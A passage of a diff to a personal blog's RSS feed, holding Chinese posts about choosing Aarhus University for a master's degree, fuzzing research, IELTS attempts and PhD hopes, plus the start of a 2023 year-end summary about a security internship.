+&lt;/h2>&lt;p>由于对🇬🇧学校的学术能力质疑，我便放弃了24fall的offer，并寻求25spring的机会。
+我申请了以下几个学校，最后大概是要去奥胡斯了。&lt;/p>
+&lt;ul>
+&lt;li>NUS CE x&lt;/li>
+&lt;li>NTU CCA （没结果）&lt;/li>
+&lt;li>Aarhus CE offer made（至于为什么不是cs， 我还想问为什么这些学校春季入学都不开cs&amp;hellip;）&lt;/li>
+&lt;/ul>
+&lt;p>说实话奥胡斯可能真没几个人听说过，排名也不高，所以为什么选择奥胡斯？
+我将从以下几个方面给出解答&lt;/p>
+&lt;h3 id="学制" >学制
+&lt;span>
+&lt;a href="#%e5%ad%a6%e5%88%b6">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;ul>
+&lt;li>北欧的学制是两年，并且两年开销 = 一年英国水硕开销，此为一胜。&lt;/li>
+&lt;li>两年学制所以平均每学期课程少，有大把时间实习or科研，此为二胜。&lt;/li>
+&lt;li>北欧的thesis可以在公司或者直接去别的学校做，提前打好connection，此为三胜。&lt;/li>
+&lt;li>北欧🇨🇳人少，不会导致反向留学，此为四胜。&lt;/li>
+&lt;li>实在不济，奥胡斯本校一年有75个博士岗位，此为五胜。&lt;/li>
+&lt;/ul>
+&lt;h3 id="csranking" >CSRanking
+&lt;span>
+&lt;a href="#csranking">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>众所周知，Qs是野榜，CSranking更是野榜。
+可以看到Aarhus University的排名在欧洲处于15名附近。与之相近的有CISPA（未来想去读博的地方），比牛剑帝国理工排名低了一点。至少在计算机上的排名还是靠谱的。&lt;/p>
+&lt;img src="https://BestRun.github.io/pictures/202410251128.png" alt="描述" width="500" height="400">
+&lt;h3 id="教授质量" >教授质量
+&lt;span>
+&lt;a href="#%e6%95%99%e6%8e%88%e8%b4%a8%e9%87%8f">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>我之前虽然拿到的🇬🇧offer排名比较靠前，但我翻遍了学院的教授名单还是找不到一位做软件安全相关的教授。
 而且教授都是多年没发paper，让我不禁怀疑🇬🇧教授的科研能力。
 反观，。。。
-&lt;img src=&#34;https://BestRun.github.io/pictures/202410251141.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Aarhus有我相关的方向，软件自动化测试和静态分析。&lt;/p&gt;
-&lt;p&gt;虽然之后我可能还是想去做LLM的安全。&lt;/p&gt;
-&lt;p&gt;而且人家这一个个组，做的什么方向，都很明确，官网上写的也一目了然，反观🇬🇧，一堆网红大学，不想再说了。&lt;/p&gt;
-&lt;h3 id=&#34;课程设计&#34; &gt;课程设计
-&lt;span&gt;
-    &lt;a href=&#34;#%e8%af%be%e7%a8%8b%e8%ae%be%e8%ae%a1&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;大概有这几个方向的课可以选（其实，上课在世界各地都没用～～～不如自己学，，，）
-&lt;img src=&#34;https://BestRun.github.io/pictures/2024110251147.png&#34; alt=&#34;描述&#34; width=&#34;300&#34; height=&#34;200&#34;&gt;
+&lt;img src="https://BestRun.github.io/pictures/202410251141.png" alt="">&lt;/p>
+&lt;p>Aarhus有我相关的方向，软件自动化测试和静态分析。&lt;/p>
+&lt;p>虽然之后我可能还是想去做LLM的安全。&lt;/p>
+&lt;p>而且人家这一个个组，做的什么方向，都很明确，官网上写的也一目了然，反观🇬🇧，一堆网红大学，不想再说了。&lt;/p>
+&lt;h3 id="课程设计" >课程设计
+&lt;span>
+&lt;a href="#%e8%af%be%e7%a8%8b%e8%ae%be%e8%ae%a1">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>大概有这几个方向的课可以选（其实，上课在世界各地都没用～～～不如自己学，，，）
+&lt;img src="https://BestRun.github.io/pictures/2024110251147.png" alt="描述" width="300" height="200">
 我对比了cs和ce的课程，其实差的就是软件逻辑，软件安全相关的几门课。
-CE可以在选修时选一门CS 10ECTS的课，到时候把想上的选了就好了。&lt;/p&gt;
-&lt;img src=&#34;https://BestRun.github.io/pictures/202410251148.png&#34; alt=&#34;描述&#34; width=&#34;400&#34; height=&#34;300&#34;&gt;
+CE可以在选修时选一门CS 10ECTS的课，到时候把想上的选了就好了。&lt;/p>
+&lt;img src="https://BestRun.github.io/pictures/202410251148.png" alt="描述" width="400" height="300">
 正常的课如编译原理，网络安全，系统安全这种课也都会有。
-&lt;p&gt;如果你不想上课，还可以选择去企业或者别的学校做项目（我早就想去联系CISPA了）&lt;/p&gt;
-&lt;p&gt;总的来说自由度较高，还可以。&lt;/p&gt;
-&lt;h2 id=&#34;实习进展&#34; &gt;实习进展
-&lt;span&gt;
-    &lt;a href=&#34;#%e5%ae%9e%e4%b9%a0%e8%bf%9b%e5%b1%95&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;我做的fuzz工作也是赢来的尾声，终于到了些论文的阶段了。在做这项工作的过程中，也是发现了很多流行的软件的bug，当你看到你提出的漏洞被修复，这种感觉还是很不错的，颇有成就感。之后就是将论文写出来，然后投出去，如果作为处女座，我并不确定能投到多么好的会议，一切随缘吧。&lt;/p&gt;
-&lt;h2 id=&#34;雅思&#34; &gt;雅思
-&lt;span&gt;
-    &lt;a href=&#34;#%e9%9b%85%e6%80%9d&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;可能大家在b站或者小红书一搜索“雅思”，出来的都是两周上7分等等等等，然而我和雅思的搏斗是极其惨烈的。我总共考了六次雅思，才考到6.5，对没错，我考了5次6分。天杀的雅思，无论我怎么写写作，都是6分，无论文怎么准备口语，最高才到6分。考到第六次，我实在没有信心和气力去刷分了。就这样吧。&lt;/p&gt;
-&lt;h2 id=&#34;未来&#34; &gt;未来
-&lt;span&gt;
-    &lt;a href=&#34;#%e6%9c%aa%e6%9d%a5&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;想象很美好，现实很残酷。&lt;/p&gt;
-&lt;p&gt;未来想去CISPA或者马普所软件安全组读个博。&lt;/p&gt;
-&lt;p&gt;做自己喜欢的事才是对的人生。&lt;/p&gt;
-&lt;h2 id=&#34;一些小成果&#34; &gt;一些小成果
-&lt;span&gt;
-    &lt;a href=&#34;#%e4%b8%80%e4%ba%9b%e5%b0%8f%e6%88%90%e6%9e%9c&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;如果说最近有一些突破，那就是我第一次尝试当队长把团队C进决赛。&lt;/p&gt;
-&lt;p&gt;前段时间在在公众号上看到了ByteAI的比赛，便想着动手参加一下。没想到发了发力还真进决赛了，明天就要去北京参加决赛了，希望有好结果。（LM的安全，从零开始，感谢在软件所的科研实习给我带来读文献和代码能力的提升。）&lt;/p&gt;
-&lt;p&gt;来点预告：
-&lt;img src=&#34;https://BestRun.github.io/pictures/4041729826047_.pic.jpg&#34; alt=&#34;描述&#34; width=&#34;600&#34; height=&#34;500&#34;&gt;&lt;/p&gt;
-&lt;p&gt;补：去北京参加了决赛，真的收获很多。
-自己的能力反思：&lt;/p&gt;
-&lt;h2 id=&#34;总结&#34; &gt;总结
-&lt;span&gt;
-    &lt;a href=&#34;#%e6%80%bb%e7%bb%93&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;我很喜欢showermaker的一句话 “失败总是贯穿人生始终,这就是人生”。&lt;/p&gt;
-&lt;p&gt;对于我这种平凡的人来说，不会奢求一直成功，但也许一些小的进展，一些小的突破，一些小的欢乐便足以构成了令我满意我的人生。&lt;/p&gt;
-&lt;p&gt;别人的目光，别人的看法，go hell吧！&lt;/p&gt;</description>
-    </item>
-    
-    <item>
-      <title>runrunzi的2023年终总结</title>
-      <link>https://BestRun.github.io/life/2023_summary/</link>
-      <pubDate>Sun, 31 Dec 2023 15:48:06 +0800</pubDate>
-      
-      <guid>https://BestRun.github.io/life/2023_summary/</guid>
-      <description>&lt;h2 id=&#34;前言&#34; &gt;前言
-&lt;span&gt;
-    &lt;a href=&#34;#%e5%89%8d%e8%a8%80&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h2&gt;&lt;p&gt;只有时常回过头看走过的路，才能更好的迈向远方。 &amp;ndash; runrunzi
+&lt;p>如果你不想上课，还可以选择去企业或者别的学校做项目（我早就想去联系CISPA了）&lt;/p>
+&lt;p>总的来说自由度较高，还可以。&lt;/p>
+&lt;h2 id="实习进展" >实习进展
+&lt;span>
+&lt;a href="#%e5%ae%9e%e4%b9%a0%e8%bf%9b%e5%b1%95">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>我做的fuzz工作也是赢来的尾声，终于到了些论文的阶段了。在做这项工作的过程中，也是发现了很多流行的软件的bug，当你看到你提出的漏洞被修复，这种感觉还是很不错的，颇有成就感。之后就是将论文写出来，然后投出去，如果作为处女座，我并不确定能投到多么好的会议，一切随缘吧。&lt;/p>
+&lt;h2 id="雅思" >雅思
+&lt;span>
+&lt;a href="#%e9%9b%85%e6%80%9d">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>可能大家在b站或者小红书一搜索“雅思”，出来的都是两周上7分等等等等，然而我和雅思的搏斗是极其惨烈的。我总共考了六次雅思，才考到6.5，对没错，我考了5次6分。天杀的雅思，无论我怎么写写作，都是6分，无论文怎么准备口语，最高才到6分。考到第六次，我实在没有信心和气力去刷分了。就这样吧。&lt;/p>
+&lt;h2 id="未来" >未来
+&lt;span>
+&lt;a href="#%e6%9c%aa%e6%9d%a5">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>想象很美好，现实很残酷。&lt;/p>
+&lt;p>未来想去CISPA或者马普所软件安全组读个博。&lt;/p>
+&lt;p>做自己喜欢的事才是对的人生。&lt;/p>
+&lt;h2 id="一些小成果" >一些小成果
+&lt;span>
+&lt;a href="#%e4%b8%80%e4%ba%9b%e5%b0%8f%e6%88%90%e6%9e%9c">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>如果说最近有一些突破，那就是我第一次尝试当队长把团队C进决赛。&lt;/p>
+&lt;p>前段时间在在公众号上看到了ByteAI的比赛，便想着动手参加一下。没想到发了发力还真进决赛了，明天就要去北京参加决赛了，希望有好结果。（LM的安全，从零开始，感谢在软件所的科研实习给我带来读文献和代码能力的提升。）&lt;/p>
+&lt;p>来点预告：
+&lt;img src="https://BestRun.github.io/pictures/4041729826047_.pic.jpg" alt="描述" width="600" height="500">&lt;/p>
+&lt;p>补：去北京参加了决赛，真的收获很多。
+自己的能力反思：&lt;/p>
+&lt;h2 id="总结" >总结
+&lt;span>
+&lt;a href="#%e6%80%bb%e7%bb%93">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>我很喜欢showermaker的一句话 “失败总是贯穿人生始终,这就是人生”。&lt;/p>
+&lt;p>对于我这种平凡的人来说，不会奢求一直成功，但也许一些小的进展，一些小的突破，一些小的欢乐便足以构成了令我满意我的人生。&lt;/p>
+&lt;p>别人的目光，别人的看法，go hell吧！&lt;/p></description></item><item><title>runrunzi的2023年终总结</title><link>https://BestRun.github.io/life/2023_summary/</link><pubDate>Sun, 31 Dec 2023 15:48:06 +0800</pubDate><guid>https://BestRun.github.io/life/2023_summary/</guid><description>&lt;h2 id="前言" >前言
+&lt;span>
+&lt;a href="#%e5%89%8d%e8%a8%80">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>只有时常回过头看走过的路，才能更好的迈向远方。 &amp;ndash; runrunzi
 不知不觉一年又过去了，此时的我一个人坐在电脑前，孤零零地写着年终总结，（😭原来大家跨年都有人陪，只有我还是一个人。
-不是很想写流水账，就分成几个模块来写吧。想了想，打算这么分&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;总的来说&lt;/li&gt;
-&lt;li&gt;工作&amp;amp;技术&lt;/li&gt;
-&lt;li&gt;生活&lt;/li&gt;
-&lt;li&gt;展望&amp;amp;规划&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;总的来说&#34; &gt;总的来说
-&lt;span&gt;
-    &lt;a href=&#34;#%e6%80%bb%e7%9a%84%e6%9d%a5%e8%af%b4&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;今年是我人生中很关键的一年，这一年会大致决定我未来的去向，未来到底要做什么。我的步调可以说是一半学，一半摆。身边的朋友有的去USA读PHD，有的去阿里这种大厂追梦，而我也在犹豫中慢慢向前摸索自己未来的路。&lt;/p&gt;
-&lt;p&gt;一年一瞬间就过去了，可能未来大概率是要去继续出国读个书的。今年最大的收获可能就是明白没有简单的路吧，体验了工业界和学术界后，有了些感觉，这些写在下面的段落中。&lt;/p&gt;
-&lt;h3 id=&#34;工作技术&#34; &gt;工作&amp;amp;技术
-&lt;span&gt;
-    &lt;a href=&#34;#%e5%b7%a5%e4%bd%9c%e6%8a%80%e6%9c%af&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h3&gt;&lt;p&gt;今年的开始是从一份实习开始的，我十分感谢这份实习，在这次实习中我学到了很多东西，体会到了前阿里云顶级sec团队的工作氛围（吹就完了）。&lt;/p&gt;
-&lt;h4 id=&#34;工作&#34; &gt;工作
-&lt;span&gt;
-    &lt;a href=&#34;#%e5%b7%a5%e4%bd%9c&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h4&gt;&lt;h5 id=&#34;eagle-cloud-internship&#34; &gt;Eagle Cloud Internship
-&lt;span&gt;
-    &lt;a href=&#34;#eagle-cloud-internship&#34;&gt;
-        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
-    &lt;/a&gt;
-&lt;/span&gt;
-&lt;/h5&gt;&lt;p&gt;今年过年面试了亿格云公司，感谢Y4👴的推荐，直接把我推到了叶总面前。面我的是刘师傅（诸多src前几名，传闻俩月挖洞挖了辆宝马）这次面试回想起来，我只想用灾难二字形容。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;简单说几个NLP相关算法，（🤔️&lt;/li&gt;
-&lt;li&gt;简单说一次你的渗透经历，（🤔️&lt;/li&gt;
-&lt;li&gt;等等等等，我只会&amp;ndash;🤔️
+不是很想写流水账，就分成几个模块来写吧。想了想，打算这么分&lt;/p>
+&lt;ul>
+&lt;li>总的来说&lt;/li>
+&lt;li>工作&amp;amp;技术&lt;/li>
+&lt;li>生活&lt;/li>
+&lt;li>展望&amp;amp;规划&lt;/li>
+&lt;/ul>
+&lt;h3 id="总的来说" >总的来说
+&lt;span>
+&lt;a href="#%e6%80%bb%e7%9a%84%e6%9d%a5%e8%af%b4">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>今年是我人生中很关键的一年，这一年会大致决定我未来的去向，未来到底要做什么。我的步调可以说是一半学，一半摆。身边的朋友有的去USA读PHD，有的去阿里这种大厂追梦，而我也在犹豫中慢慢向前摸索自己未来的路。&lt;/p>
+&lt;p>一年一瞬间就过去了，可能未来大概率是要去继续出国读个书的。今年最大的收获可能就是明白没有简单的路吧，体验了工业界和学术界后，有了些感觉，这些写在下面的段落中。&lt;/p>
+&lt;h3 id="工作技术" >工作&amp;amp;技术
+&lt;span>
+&lt;a href="#%e5%b7%a5%e4%bd%9c%e6%8a%80%e6%9c%af">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;p>今年的开始是从一份实习开始的，我十分感谢这份实习，在这次实习中我学到了很多东西，体会到了前阿里云顶级sec团队的工作氛围（吹就完了）。&lt;/p>
+&lt;h4 id="工作" >工作
+&lt;span>
+&lt;a href="#%e5%b7%a5%e4%bd%9c">
